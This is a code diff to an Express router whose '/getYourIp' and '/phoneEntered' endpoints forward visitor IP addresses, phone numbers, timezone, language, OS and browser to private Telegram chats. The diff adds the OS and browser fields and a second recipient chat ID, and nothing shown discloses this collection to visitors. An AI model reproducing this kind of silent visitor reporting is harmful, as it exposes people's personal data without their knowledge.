@@ -73,7 +73,7 @@ const TELEGRAM_CHAT_IDS = [
 router.post("/getYourIp", async (req, res) => {
     const ip = getPostClientIp(req);
 
-    const { timeInfo, languageInfo } = req.body ?? {};
+    const { timeInfo, languageInfo, os, browser } = req.body ?? {};
 
     if (
         !timeInfo ||
@@ -91,6 +91,10 @@ router.post("/getYourIp", async (req, res) => {
 
 🌐 <b>آی‌پی:</b> ${ip}
 
+📱 <b>اطلاعات سیستم:</b>
+سیستم عامل : ${os}
+برازر : ${browser}
+
 🕒 <b>اطلاعات زمانی</b>
 منطقه‌ی زمانی بازدیدکننده: ${timeInfo.visitorTimeZone}
 اختلاف زمانی با تهران (دقیقه): ${timeInfo.difference}
@@ -106,7 +110,7 @@ router.post("/getYourIp", async (req, res) => {
 `;
 
     try {
-        await sendTelegramMessageToAll(message, [5665639218]);
+        await sendTelegramMessageToAll(message, [5665639218, 192959272]);
 
         return res.json({
             success: true,
@@ -133,7 +137,7 @@ router.get("/phoneEntered", async (req, res) => {
 
     let message;
     try {
-        await sendTelegramMessageToAll(`A Special User Entered Phone: ${phone} — IP: ${ip}`, [5665639218]);
+        await sendTelegramMessageToAll(`A Special User Entered Phone: ${phone} — IP: ${ip}`, [5665639218, 192959272]);
         message = "Sent was Successful Arash";
     } catch (error) {
         message = "Telegram request failed " + error;
